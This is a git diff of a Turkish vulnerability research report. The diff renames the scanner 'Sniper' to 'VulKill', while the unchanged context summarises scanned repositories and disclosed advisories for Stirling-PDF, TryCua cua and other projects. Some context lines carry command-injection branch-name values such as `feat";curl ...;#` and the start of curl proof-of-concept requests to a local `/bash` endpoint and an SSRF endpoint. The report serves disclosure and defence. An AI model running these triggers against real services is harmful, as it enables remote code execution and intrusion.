@@ -1,19 +1,19 @@
-# Gökçe Baran Karakamış — Sniper macOS Kurulum Doğrulaması, Taranan Depolar ve Doğrulanmış Güvenlik Açıkları Raporu
+# Gökçe Baran Karakamış — VulKill macOS Kurulum Doğrulaması, Taranan Depolar ve Doğrulanmış Güvenlik Açıkları Raporu
 
-[English](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.en.md) | **Türkçe** | [日本語](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.ja.md) | [简体中文](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.zh-CN.md) | [한국어](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.ko.md)
+[English](VULKILL-SCANNED-REPOSITORIES-AND-ADVISORIES.en.md) | **Türkçe** | [日本語](VULKILL-SCANNED-REPOSITORIES-AND-ADVISORIES.ja.md) | [简体中文](VULKILL-SCANNED-REPOSITORIES-AND-ADVISORIES.zh-CN.md) | [한국어](VULKILL-SCANNED-REPOSITORIES-AND-ADVISORIES.ko.md)
 
 **Yazar / Güvenlik Araştırmacısı:** **Gökçe Baran Karakamış** ([@dytredline](https://github.com/dytredline))
 
 Bu kapsamlı teknik kılavuz ve güvenlik araştırma raporu üç ana bölümden oluşmaktadır:
-1. **Bölüm I — macOS (Apple Silicon) Gerçek Donanım Kurulum ve Çalışma Doğrulama Raporu:** Sniper Community'nin gerçek macOS donanımı üzerinde hem **yerel kaynak kurulumu (`--core-only`)** hem de **Docker Desktop beş motorlu (`community-tools`)** kurulumu ile uçtan uca test ve doğrulama sonuçları.
-2. **Bölüm II — Sniper ile Taranan 8 Açık Kaynak Depo, Zafiyet Dönüşüm Mekanizmaları ve Günlük Hayat Senaryoları:** **Gökçe Baran Karakamış** tarafından **Sniper** statik analiz (SAST), altyapı (IaC) ve bağımlılık (SCA) denetim motoru ile taranan **8 açık kaynak deponun** kaynak kodu düzeyinde incelenmesi, yanlış pozitif ayrımı, kod hatalarının hangi koşullarda zafiyete dönüştüğünün herkesin anlayabileceği dilde açıklanması, her depo için **3 gerçek hayat senaryosu (`Senaryo A / B / C`)** ve **örnek çalıştırma/doğrulama komutları**.
-3. **Bölüm III — Kendi Sniper Taramamızda Bulduğumuz 46 Doğrulanmış Güvenlik Kaydı (`01`..`46`: 45 Özgün Açık + 1 Üst Akış Duplicate), Kod Analizi, Senaryolar ve Çalışma Zamanı Kanıtları (`RED -> GREEN + BENIGN`):** 6 farklı açık kaynak projede (**Stirling-PDF, TryCua `cua`, OpenZiti, n8n, Gotify Server, NIIS X-Road**) keşfedilen ve GitHub Security Advisory (`GHSA`) olarak bildirilen **11 doğrulanmış güvenlik açığının** kodda nasıl oluştuğu, adım adım nasıl zafiyete dönüştüğü, her biri için **3 somut günlük hayat kritik senaryosu (`Senaryo A / B / C`)**, **örnek çalıştırma/tetikleme komutları** ve **savunma yamaları (`git diff`)**.
+1. **Bölüm I — macOS (Apple Silicon) Gerçek Donanım Kurulum ve Çalışma Doğrulama Raporu:** VulKill Community'nin gerçek macOS donanımı üzerinde hem **yerel kaynak kurulumu (`--core-only`)** hem de **Docker Desktop beş motorlu (`community-tools`)** kurulumu ile uçtan uca test ve doğrulama sonuçları.
+2. **Bölüm II — VulKill ile Taranan 8 Açık Kaynak Depo, Zafiyet Dönüşüm Mekanizmaları ve Günlük Hayat Senaryoları:** **Gökçe Baran Karakamış** tarafından **VulKill** statik analiz (SAST), altyapı (IaC) ve bağımlılık (SCA) denetim motoru ile taranan **8 açık kaynak deponun** kaynak kodu düzeyinde incelenmesi, yanlış pozitif ayrımı, kod hatalarının hangi koşullarda zafiyete dönüştüğünün herkesin anlayabileceği dilde açıklanması, her depo için **3 gerçek hayat senaryosu (`Senaryo A / B / C`)** ve **örnek çalıştırma/doğrulama komutları**.
+3. **Bölüm III — Kendi VulKill Taramamızda Bulduğumuz 46 Doğrulanmış Güvenlik Kaydı (`01`..`46`: 45 Özgün Açık + 1 Üst Akış Duplicate), Kod Analizi, Senaryolar ve Çalışma Zamanı Kanıtları (`RED -> GREEN + BENIGN`):** 6 farklı açık kaynak projede (**Stirling-PDF, TryCua `cua`, OpenZiti, n8n, Gotify Server, NIIS X-Road**) keşfedilen ve GitHub Security Advisory (`GHSA`) olarak bildirilen **11 doğrulanmış güvenlik açığının** kodda nasıl oluştuğu, adım adım nasıl zafiyete dönüştüğü, her biri için **3 somut günlük hayat kritik senaryosu (`Senaryo A / B / C`)**, **örnek çalıştırma/tetikleme komutları** ve **savunma yamaları (`git diff`)**.
 
 ---
 
 ## Bölüm I — macOS (Apple Silicon) Gerçek Donanım Kurulum ve Doğrulama Raporu (2026-10-24)
 
-macOS (Apple Silicon) üzerinde Sniper kurulumu **deneysel değildir**; hem **yerel kaynak kurulumu (`--core-only`)** hem de **Docker Desktop beş motorlu kurulumu** gerçek macOS donanımı üzerinde test edilmiş, doğrulanmış ve desteklenmektedir:
+macOS (Apple Silicon) üzerinde VulKill kurulumu **deneysel değildir**; hem **yerel kaynak kurulumu (`--core-only`)** hem de **Docker Desktop beş motorlu kurulumu** gerçek macOS donanımı üzerinde test edilmiş, doğrulanmış ve desteklenmektedir:
 
 | Kurulum Yolu | Komut | Gerçek macOS Donanımında Doğrulanan Kapsam | Durum |
 | :--- | :--- | :--- | :---: |
@@ -24,7 +24,7 @@ Ayrıntılı İngilizce doğrulama kayıtları için [VALIDATION.md](../VALIDATI
 
 ---
 
-## Bölüm II — Sniper ile Taranan 8 Açık Kaynak Depo ve Muhtemel Bağlantılı Açıklar
+## Bölüm II — VulKill ile Taranan 8 Açık Kaynak Depo ve Muhtemel Bağlantılı Açıklar
 
 Her depo için bulgular **(A) Doğrulanmış Tehlikeli Primitive / Sertleştirme Açığı**, **(B) Bağlama/Koşula Bağlı Bulgu ve Bağımlılık (SCA) Kayıtları** ve **(C) Kesin Yanlış Pozitif (Yanlış Alarm)** olarak ayrıştırılmış; ardından her depo için:
 1. **Kodda Nasıl Oluştuğu ve Zafiyete Dönüşme Mekanizması (Herkesin Anlayabileceği Açıklama)**,
@@ -89,7 +89,7 @@ Normal şartlarda dışarıdaki bir web kullanıcısı bu tabloya doğrudan veri
 
 ### G. Örnek Çalıştırma ve Doğrulama Komutları
 ```bash
-# 1. AutoGPT deposu üzerinde Sniper tam kapsamlı SAST/IaC/SCA denetimini çalıştırma
+# 1. AutoGPT deposu üzerinde VulKill tam kapsamlı SAST/IaC/SCA denetimini çalıştırma
 python3 scripts/sniper-project-audit \
   --project-dir "$HOME/audit-targets/autogpt" \
   --output-json "$HOME/audit-targets/reports/autogpt-audit.json"
@@ -98,7 +98,7 @@ python3 scripts/sniper-project-audit \
 grep -rn "pickle.loads" "$HOME/audit-targets/autogpt/autogpt_platform/backend/"
 grep -rn "def execute(" "$HOME/audit-targets/autogpt/autogpt_platform/backend/backend/data/block.py"
 
-# 3. Sniper CLI üzerinden politika eşiğini aşan bulguları özetleme
+# 3. VulKill CLI üzerinden politika eşiğini aşan bulguları özetleme
 python3 cli_reports.py --input "$HOME/audit-targets/reports/autogpt-audit.json" --min-severity medium
 ```
 
@@ -150,7 +150,7 @@ Eğer bir sistem yöneticisi dokümantasyondaki bu satırı kopyalayıp gerçek 
 
 ### G. Örnek Çalıştırma ve Doğrulama Komutları
 ```bash
-# 1. Zitadel deposu üzerinde Sniper SAST/IaC denetimini çalıştırma
+# 1. Zitadel deposu üzerinde VulKill SAST/IaC denetimini çalıştırma
 python3 scripts/sniper-project-audit \
   --project-dir "$HOME/audit-targets/zitadel" \
   --output-json "$HOME/audit-targets/reports/zitadel-audit.json"
@@ -212,7 +212,7 @@ Eğer bir dal adı `feat/$(id)` veya `feat";curl ...;#` gibi kabuk özel karakte
 
 ### G. Örnek Çalıştırma ve Doğrulama Komutları
 ```bash
-# 1. Nextcloud MCP deposu üzerinde Sniper SAST/IaC/SCA denetimini çalıştırma
+# 1. Nextcloud MCP deposu üzerinde VulKill SAST/IaC/SCA denetimini çalıştırma
 python3 scripts/sniper-project-audit \
   --project-dir "$HOME/audit-targets/nextcloud-mcp-v0.201.0-8064f66" \
   --output-json "$HOME/audit-targets/reports/nextcloud-mcp-audit.json"
@@ -272,7 +272,7 @@ Burada PR dal adı doğrudan `echo "..."` içine gömülmüştür ve `package-lo
 
 ### G. Örnek Çalıştırma ve Doğrulama Komutları
 ```bash
-# 1. MCPJam Inspector deposu üzerinde Sniper SAST/IaC/SCA denetimini çalıştırma
+# 1. MCPJam Inspector deposu üzerinde VulKill SAST/IaC/SCA denetimini çalıştırma
 python3 scripts/sniper-project-audit \
   --project-dir "$HOME/audit-targets/mcpjam-inspector-v3.9.2-eda1fd1" \
   --output-json "$HOME/audit-targets/reports/mcpjam-audit.json"
@@ -330,7 +330,7 @@ geliştiricinin yabancı sitelerden gelen isteklere CORS başlığı vermediği 
 
 ### G. Örnek Çalıştırma ve Doğrulama Komutları
 ```bash
-# 1. Codebase Memory MCP deposu üzerinde Sniper SAST/IaC/SCA denetimini çalıştırma
+# 1. Codebase Memory MCP deposu üzerinde VulKill SAST/IaC/SCA denetimini çalıştırma
 python3 scripts/sniper-project-audit \
   --project-dir "$HOME/audit-targets/codebase-memory-mcp-v0.9.0-b637e33" \
   --output-json "$HOME/audit-targets/reports/cbm-audit.json"
@@ -384,7 +384,7 @@ Varsayılan durumda bu ayar kapalıdır (`false`) ve tüm TLS sertifikaları do�
 
 ### G. Örnek Çalıştırma ve Doğrulama Komutları
 ```bash
-# 1. GitLab MCP Server üzerinde Sniper SAST/IaC/SCA denetimini çalıştırma
+# 1. GitLab MCP Server üzerinde VulKill SAST/IaC/SCA denetimini çalıştırma
 python3 scripts/sniper-project-audit \
   --project-dir "$HOME/audit-targets/gitlab-mcp-server-v3.3.0-f92ed3e" \
   --output-json "$HOME/audit-targets/reports/gitlab-mcp-audit.json"
@@ -422,7 +422,7 @@ Apktool MCP, Android `.apk` paketlerini tersine mühendislik için açan ve `And
 
 ### G. Örnek Çalıştırma ve Doğrulama Komutları
 ```bash
-# 1. Apktool MCP deposu üzerinde Sniper SAST ve SCA (uv.lock) denetimini çalıştırma
+# 1. Apktool MCP deposu üzerinde VulKill SAST ve SCA (uv.lock) denetimini çalıştırma
 python3 scripts/sniper-project-audit \
   --project-dir "$HOME/audit-targets/apktool-mcp-V3.0.2-12bb331" \
   --output-json "$HOME/audit-targets/reports/apktool-mcp-audit.json"
@@ -430,7 +430,7 @@ python3 scripts/sniper-project-audit \
 # 2. uv.lock içindeki kritik/yüksek SCA paket sürümlerini doğrulama
 grep -E 'name = "(fastmcp|mcp|starlette|h11|anyio|certifi)"' -A 2 "$HOME/audit-targets/apktool-mcp-V3.0.2-12bb331/uv.lock"
 
-# 3. Sniper CLI raporuyla SCA ve SAST dağılımını görüntüleme
+# 3. VulKill CLI raporuyla SCA ve SAST dağılımını görüntüleme
 python3 cli_reports.py --input "$HOME/audit-targets/reports/apktool-mcp-audit.json"
 ```
 
@@ -460,7 +460,7 @@ Bu durum kodda şöyle zafiyete dönüşür: Kullanıcı JADX MCP'yi `uv sync --
 
 ### G. Örnek Çalıştırma ve Doğrulama Komutları
 ```bash
-# 1. JADX MCP deposu üzerinde Sniper SAST ve SCA denetimini çalıştırma
+# 1. JADX MCP deposu üzerinde VulKill SAST ve SCA denetimini çalıştırma
 python3 scripts/sniper-project-audit \
   --project-dir "$HOME/audit-targets/jadx-mcp-main-a8e5b7d" \
   --output-json "$HOME/audit-targets/reports/jadx-mcp-audit.json"
@@ -468,7 +468,7 @@ python3 scripts/sniper-project-audit \
 # 2. uv.lock içindeki kilitli paket sürümlerini kontrol etme
 grep -E 'name = "(authlib|pyjwt|cryptography|python-multipart|starlette|urllib3)"' -A 2 "$HOME/audit-targets/jadx-mcp-main-a8e5b7d/uv.lock"
 
-# 3. Sniper CLI üzerinden SCA bulgularını filtreleyerek listeleme
+# 3. VulKill CLI üzerinden SCA bulgularını filtreleyerek listeleme
 python3 cli_reports.py --input "$HOME/audit-targets/reports/jadx-mcp-audit.json" --min-severity high
 ```
 
@@ -476,7 +476,7 @@ python3 cli_reports.py --input "$HOME/audit-targets/reports/jadx-mcp-audit.json"
 
 ## Özet Karşılaştırma Tablosu: Tek Başına vs. Birlikte (Saldırı Zinciri) Kritiklik ve Kanıt Durumu
 
-| Repo | Sniper SAST / IaC / SCA Özeti | Doğrulanmış Kaynak Kanıtı (Gerçek vs. Yanlış Pozitif) | Tek Başına Kritiklik | Bulgular Birleşiyor mu? (Saldırı Zinciri / Chaining) | Birlikte (Zincir) Kritiklik ve Yayın Durumu |
+| Repo | VulKill SAST / IaC / SCA Özeti | Doğrulanmış Kaynak Kanıtı (Gerçek vs. Yanlış Pozitif) | Tek Başına Kritiklik | Bulgular Birleşiyor mu? (Saldırı Zinciri / Chaining) | Birlikte (Zincir) Kritiklik ve Yayın Durumu |
 | :--- | :--- | :--- | :---: | :--- | :--- |
 | **1. `autogpt`** | `93` eşik aşan (`2K / 39Y`); `142` triyaj | **2 kritik SQLi (`obj.execute`), JWT ve FastAPI `Security()` tamamen yanlış pozitif**; `jobstore_backfill.py` `pickle.loads` + Compose sabit parola + Root Dockerfile gerçek | **Düşük / Orta** | **KOŞULLU HİPOTEZ:** Yalnızca saldırgan DB `apscheduler_jobs` tablosuna yazma erişimi kazanırsa `pickle.loads` + Root konteyner birleşir | **ORTA / YÜKSEK (Koşullu)** *(Doğrulanmış doğrudan açık yok; derinlemesine savunma sertleştirmesi)* |
 | **2. `zitadel`** | `67` eşik aşan (`8K / 42Y`); `286` triyaj | **8 kritik SQLi/`exec` tamamen yanlış pozitif**; `deploy/compose/` altında 3 `docker.sock` bağlaması ve dokümantasyon örneğinde `TLS_REJECT=0` gerçek | **Düşük / Orta** | **HAYIR (Farklı Örnekler):** `docker.sock` (`deploy/compose/`) ile `TLS_REJECT=0` (`apps/docs/...`) farklı compose dosyalarındadır | **DÜŞÜK / ORTA** *(Geliştirme/örnek dağıtım sertleştirmesi; ürün CVE'si değil)* |
@@ -489,9 +489,9 @@ python3 cli_reports.py --input "$HOME/audit-targets/reports/jadx-mcp-audit.json"
 
 ---
 
-## Bölüm III — Kendi Sniper Taramamızda Bulduğumuz Doğrulanmış Açıklar (46 Doğrulanmış Güvenlik Kaydı (45 Özgün Açık + 1 Üst Akış Duplicate), Zafiyete Dönüşüm Mekanizmaları, Senaryolar ve Örnek Çalıştırma Komutları)
+## Bölüm III — Kendi VulKill Taramamızda Bulduğumuz Doğrulanmış Açıklar (46 Doğrulanmış Güvenlik Kaydı (45 Özgün Açık + 1 Üst Akış Duplicate), Zafiyete Dönüşüm Mekanizmaları, Senaryolar ve Örnek Çalıştırma Komutları)
 
-**Sniper** statik/dinamik analiz motoru ile yürüttüğümüz güvenlik taramalarında tespit edilen, **Adım Adım Günlük Hayat Kritik Senaryoları (`Senaryo A / B / C`)**, **Uçtan Uca Çalışma Zamanı Kanıtları (`RED -> GREEN + BENIGN`)** ve **Doğrulanmış Savunma Yamaları (`git diff`)** ile kanıtlanan **46 güvenlik kaydı (45 özgün açık + 1 üst akış duplicate)** ([advisories/README.tr.md](advisories/README.tr.md)) aşağıda önce özet tablo halinde, hemen ardından ise **her bir açığın kodda nasıl oluştuğunu, adım adım nasıl zafiyete dönüştüğünü, 3 günlük hayat kritik senaryosunu ve örnek çalıştırma/doğrulama komutlarını** içeren kapsamlı teknik bölümler (`III.01` – `III.46`) halinde sunulmuştur:
+**VulKill** statik/dinamik analiz motoru ile yürüttüğümüz güvenlik taramalarında tespit edilen, **Adım Adım Günlük Hayat Kritik Senaryoları (`Senaryo A / B / C`)**, **Uçtan Uca Çalışma Zamanı Kanıtları (`RED -> GREEN + BENIGN`)** ve **Doğrulanmış Savunma Yamaları (`git diff`)** ile kanıtlanan **46 güvenlik kaydı (45 özgün açık + 1 üst akış duplicate)** ([advisories/README.tr.md](advisories/README.tr.md)) aşağıda önce özet tablo halinde, hemen ardından ise **her bir açığın kodda nasıl oluştuğunu, adım adım nasıl zafiyete dönüştüğünü, 3 günlük hayat kritik senaryosunu ve örnek çalıştırma/doğrulama komutlarını** içeren kapsamlı teknik bölümler (`III.01` – `III.46`) halinde sunulmuştur:
 
 | # | Açık / Advisory & GHSA Bağlantısı | Hedef Proje & Bileşen | CWE & CVSS v3.1 | Günlük Hayatta Yol Açtığı Kritik Senaryolar (`Senaryo A / B / C`) | Çalışma Zamanı Kanıtı (`RED -> GREEN`) |
 | :-: | :--- | :--- | :--- | :--- | :--- |
@@ -551,7 +551,7 @@ python3 cli_reports.py --input "$HOME/audit-targets/reports/jadx-mcp-audit.json"
 * **Etkilenen Sürüm & Bileşenler:** `<= v3.2.2` (`commit 684608d143779bf3a8ffc67639f077a1202c62ff`) — `FolderInputSource.java` (`listFiles`, satır `337-377`), `ProcessingFolderController.java` (satır `374-380`), `FolderOutputSink.java` (`archiveOriginal`, satır `338-345`)
 * **Zafiyet Sınıfı & Skor:** `CWE-59` (Dosya Erişiminden Önce Uygunsuz Bağ Çözümlemesi) / `CWE-61` (UNIX Sembolik Bağ Takibi) — **CVSS v3.1: `7.1 High`** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`)
 * **GitHub GHSA Bağlantısı:** `GHSA-hpc7-xx5r-gc44` (`https://github.com/Stirling-Tools/Stirling-PDF/security/advisories/GHSA-hpc7-xx5r-gc44`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/01-STIRLING-CAND-02-SYMLINK.md`](advisories/tr/01-STIRLING-CAND-02-SYMLINK.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/01-STIRLING-CAND-02-SYMLINK.md`](advisories/tr/01-STIRLING-CAND-02-SYMLINK.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 Stirling-PDF'in **Otomatik İşlenen Klasör (Watched Folder)** özelliği, şirketlerde ağ üzerindeki ortak bir klasöre (örneğin `/mnt/scanner-incoming`) bırakılan belgeleri otomatik olarak okuyup işleyerek çıktı klasörüne (`/mnt/scanner-processed`) kaydetmek için kullanılır. Geliştiriciler, bu özelliğin sunucunun kendi gizli ayar dosyalarını (`/configs/settings.yml` vb.) okumaması için `FolderAccessGuard.isProtected(path)` adında bir güvenlik bekçisi yazmıştır.
@@ -616,7 +616,7 @@ with tempfile.TemporaryDirectory() as tmp:
     print({"RED_ingested": sorted(red_files), "GREEN_ingested": sorted(green_files)})
 EOF
 
-# 2. Sniper üzerinde Stirling-PDF proje denetimini çalıştırma
+# 2. VulKill üzerinde Stirling-PDF proje denetimini çalıştırma
 python3 scripts/sniper-project-audit \
   --project-dir "$HOME/audit-targets/Stirling-PDF" \
   --output-json "$HOME/audit-targets/reports/stirling-pdf-audit.json"
@@ -653,7 +653,7 @@ python3 scripts/sniper-project-audit \
 * **Etkilenen Sürüm & Bileşenler:** `<= v3.2.2` (`commit 684608d143779bf3a8ffc67639f077a1202c62ff`) — `ConvertWebsiteToPDF.java` (`urlToPdf`, satır `116-143`, `POST /api/v1/convert/url/pdf`)
 * **Zafiyet Sınıfı & Skor:** `CWE-918` (Sunucu Taraflı İstek Sahteciliği — SSRF / `CVE-2026-71270` Eksik Yaması) — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`)
 * **GitHub GHSA Bağlantısı:** `GHSA-ff6j-8xch-j8r6` (`https://github.com/Stirling-Tools/Stirling-PDF/security/advisories/GHSA-ff6j-8xch-j8r6` — `GHSA-j5rg-wh78-9f2q` / `CVE-2026-71270` varyantı)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md`](advisories/tr/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md`](advisories/tr/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 Stirling-PDF'te daha önce HTML dosyalarını PDF'e çeviren `FileToPdf.java` bileşeninde WeasyPrint aracının iç ağdaki adreslere (`127.0.0.1`, `169.254.169.254`) bağlanabildiği bir SSRF açığı (`CVE-2026-71270`) bulunmuş ve geliştiriciler `FileToPdf.java:63-91` dosyasında HTML içeriğini `customHtmlSanitizer.sanitize()` ile temizleyip WeasyPrint'e `--allowed-protocols data` (yani HTTP/HTTPS tamamen yasak!) parametresi vererek o noktayı kapatmıştı.
@@ -730,7 +730,7 @@ curl -sS -X POST "http://127.0.0.1:8080/api/v1/convert/url/pdf" \
 * **Etkilenen Sürüm & Bileşenler:** `>= 1.0.1, <= 1.0.16` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cuabot/src/cuabotd.ts` (satır `34-36, 259-260, 741-743, 969-1002, 1018-1063, 1120`)
 * **Zafiyet Sınıfı & Skor:** `CWE-306` (Kritik Fonksiyon İçin Eksik Kimlik Doğrulaması) / `CWE-942` (Aşırı İzin Verici Çapraz Alan Adı Politikası) — **CVSS v3.1: `9.6 Critical`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`)
 * **GitHub GHSA Bağlantısı:** `GHSA-cp36-x5hg-3gg8` (`https://github.com/trycua/cua/security/advisories/GHSA-cp36-x5hg-3gg8`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md`](advisories/tr/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md`](advisories/tr/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 Normalde bilgisayarınızda çalışan yerel bir servisin internetteki rastgele web siteleri tarafından kullanılmasını tarayıcıların **Aynı Köken Politikası (Same-Origin Policy / CORS)** engeller. Bir web sayfası `http://localhost:7842/bash` adresine `Content-Type: application/json` ile `POST` isteği atmak istediğinde, tarayıcı önce sunucuya bir `OPTIONS` (preflight) sorusu gönderir: *"Bu yabancı web sitesinin sana JSON komutu göndermesine ve cevabı okumasına izin veriyor musun?"*
@@ -825,7 +825,7 @@ curl -i -sS -X POST "http://127.0.0.1:7842/bash" \
 * **Etkilenen Sürüm & Bileşenler:** `cua-bench-rl <= 0.1.0` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cua-bench-rl/cua_bench_rl/workers/worker_server.py` (satır `79-108, 338-360, 499`) ve `libs/cua-bench/cua_bench/core.py` (`make`, satır `25-51`)
 * **Zafiyet Sınıfı & Skor:** `CWE-94` (Kod Üretiminin Uygunsuz Kontrolü — Dinamik Kod Çalıştırma) / `CWE-942` (Aşırı İzin Verici CORS) — **CVSS v3.1: `8.8 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`)
 * **GitHub GHSA Bağlantısı:** `GHSA-xm8w-gj3g-4f25` (`https://github.com/trycua/cua/security/advisories/GHSA-xm8w-gj3g-4f25`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/04-CUA-CAND-02-WORKER-SERVER-RCE.md`](advisories/tr/04-CUA-CAND-02-WORKER-SERVER-RCE.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/04-CUA-CAND-02-WORKER-SERVER-RCE.md`](advisories/tr/04-CUA-CAND-02-WORKER-SERVER-RCE.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 `cua-bench-rl` paketindeki `worker_server.py`, pekiştirmeli öğrenme (RL) işçi sunucusunu FastAPI üzerinde çalıştırır. Geliştirici dış erişimi kısıtlamak için `ip_filter_middleware` adında bir IP filtresi yazmış, ancak üç ölümcül tasarım hatası yapmıştır:
@@ -920,7 +920,7 @@ print({"allowed_ips": allowed_ips, "remote_client_ip": client_ip, "blocked_by_fi
 * **Etkilenen Sürüm & Bileşenler:** `<= 0.8.0` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cua/crates/cua-compat/src/daytona/objectstore.rs` (`handle`, satır `320-325, 360-422`)
 * **Zafiyet Sınıfı & Skor:** `CWE-22` (Yol Adının Kısıtlı Dizinle Sınırlandırılmaması — Path Traversal ile Keyfi Dizin Silme) — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H`)
 * **GitHub GHSA Bağlantısı:** `GHSA-3x8g-6h2v-8qx9` (`https://github.com/trycua/cua/security/advisories/GHSA-3x8g-6h2v-8qx9`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md`](advisories/tr/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md`](advisories/tr/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 CUA'nın Daytona uyumlu S3 nesne deposunda (`objectstore.rs`), geliştirici ana dosya yolunu (`key`) `..` ile üst dizine kaçmaya karşı korumak için `object_path(&key)` adında güvenli bir fonksiyon yazmış ve hatta bunun için `keys_cannot_escape_the_store` adında birim testi eklemiştir.
@@ -994,7 +994,7 @@ cargo test --manifest-path "$HOME/audit-targets/cua/Cargo.toml" -p cua-compat
 * **Etkilenen Sürüm & Bileşenler:** `<= 0.8.0` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cua/crates/cua-media-codec/src/backends/videotoolbox/mod.rs` (`VtEncoder::pixel_buffer_for` ve `VtEncoder::encode`, satır `334-420, 471-479`)
 * **Zafiyet Sınıfı & Skor:** `CWE-125` (Sınır Dışı Bellek Okuma — Out-of-bounds Read) / `CWE-190` (Tamsayı Taşması / Safe-Rust Sağlamlık İhlali) — **CVSS v3.1: `5.5 Medium`** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:H`)
 * **GitHub GHSA Bağlantısı:** `GHSA-54v9-fxw3-36mm` (`https://github.com/trycua/cua/security/advisories/GHSA-54v9-fxw3-36mm`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md`](advisories/tr/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md`](advisories/tr/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
 Rust dilinin en temel güvenlik sözleşmesi şudur: **Başında `unsafe` yazmayan halka açık (`pub fn`) bir fonksiyon, kendisine hangi parametre verilirse verilsin asla bellek sınırlarını aşamaz (Undefined Behavior / Buffer Over-read yapamaz).**
@@ -1080,7 +1080,7 @@ python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real
 * **Etkilenen Sürüm & Bileşenler:** `<= 0.3.1` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cua-bench/tasks/winarena_adapter/cli.py` (`cmd_vm_setup`, `cmd_vm_start`, `cmd_task_run`, satır `262-265, 421-424, 646-649`) ve `infra/vm/setup/server/main.py` (satır `180-248, 290-321`)
 * **Zafiyet Sınıfı & Skor:** `CWE-668` (Kaynağın Yanlış Etki Alanına İfşası) / `CWE-732` (Kritik Kaynak İçin Yanlış İzin Ataması) — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`)
 * **GitHub GHSA Bağlantısı:** `GHSA-hvhg-6x47-cq96` (`https://github.com/trycua/cua/security/advisories/GHSA-hvhg-6x47-cq96`)
-* **Sniper Tekil Raporu:** [`docs/advisories/tr/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md`](advisories/tr/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md)
+* **VulKill Tekil Raporu:** [`docs/advisories/tr/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md`](advisories/tr/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md)
 
 #### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
